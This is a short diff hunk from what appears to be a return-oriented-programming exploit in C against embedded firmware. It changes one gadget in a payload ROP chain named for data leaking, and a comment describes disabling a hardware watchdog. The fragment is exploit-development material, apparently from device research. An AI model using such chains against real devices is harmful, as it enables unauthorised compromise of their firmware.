@@ -145,7 +145,7 @@ uint32_t init_ropchain_0_5_120[] = {
 // the payload ROP chain. here, we will have a lot of space to do whatever we want.
 uint32_t leak_data_main_ropchain_0_5_120[] = {
     0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, r8, r9, r10, r11
-    GADGET_SET_U32_VAL___0_5_120, // pc
+    GADGET_SET_U32_INIT_POP___0_5_120, // pc
 
     // ==== DISABLE WATCHDOG ====
     // *(uint32_t*)0x40500c00 = 0x1acce551
